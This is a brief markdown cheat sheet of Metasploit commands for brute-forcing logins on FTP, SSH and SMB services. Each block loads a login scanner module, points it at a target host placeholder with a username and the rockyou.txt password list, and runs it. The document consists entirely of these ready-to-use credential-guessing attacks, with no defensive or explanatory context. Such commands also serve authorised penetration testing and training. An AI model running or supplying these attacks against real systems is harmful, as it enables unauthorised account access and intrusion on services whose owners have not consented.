# BRUTEFORCE — Metasploit

## FTP
```bash
use auxiliary/scanner/ftp/ftp_login
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME <USER>
set RHOSTS <TARGET_IP>
run
```

## SSH
```bash
use auxiliary/scanner/ssh/ssh_login
set USERNAME <USER>
set PASS_FILE /usr/share/wordlists/rockyou.txt
set RHOSTS <TARGET_IP>
run
```

## SMB/SAMBA
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS <TARGET_IP>
set VERBOSE false
set SMBUser <USER>
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```
